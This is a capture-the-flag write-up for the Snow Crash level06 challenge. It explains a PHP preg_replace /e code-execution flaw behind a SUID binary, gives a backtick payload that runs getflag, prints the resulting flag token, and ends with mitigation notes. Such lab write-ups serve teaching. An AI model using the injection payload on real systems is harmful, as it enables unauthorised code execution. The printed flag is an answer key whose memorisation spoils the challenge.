# Level06 - Snow Crash Exploit

## Description

Upon logging in as `level06`, two files are present in the home directory:

```
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

- `level06`: a SUID binary owned by `flag06`
- `level06.php`: a PHP script

Running the binary without arguments produces:
```
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```

Passing a filename as an argument prints the file's contents:
```bash
echo "Hello there" > /tmp/hello_there
./level06 /tmp/hello_there
# Output: Hello there
```

## Source Code Analysis

The `level06.php` script contains:
```php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

### Key Points

- The script reads the file provided as the first argument.
- It uses `preg_replace` with the `/e` modifier, which evaluates the replacement string as PHP code.
- The pattern `/(\[x (.*)\])/e` matches `[x ...]` and passes the inner content to the `y()` function, which does some replacements and returns the result.

**PHP's `/e` modifier is dangerous**: it allows code execution based on user input.

## Exploitation

By crafting a file containing a payload that leverages PHP's execution operators, we can execute arbitrary shell commands.

### Steps

1. **Create a file with the payload:**
    ```bash
    echo '[x ${`getflag`} ]' > /tmp/getflag06
    ```

2. **Run the vulnerable binary:**
    ```bash
    ./level06 /tmp/getflag06
    ```

3. **Output:**
    ```
    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
     in /home/user/level06/level06.php(4) : regexp code on line 1
    ```

The flag is revealed in the output.

## Mitigation

- Never use the `/e` modifier in `preg_replace` (it is removed in PHP 7+).
- Avoid evaluating user input as code.
- Sanitize and validate all user input.

## Flag

```
wiok45aaoguiboiki2tuin6ub
```
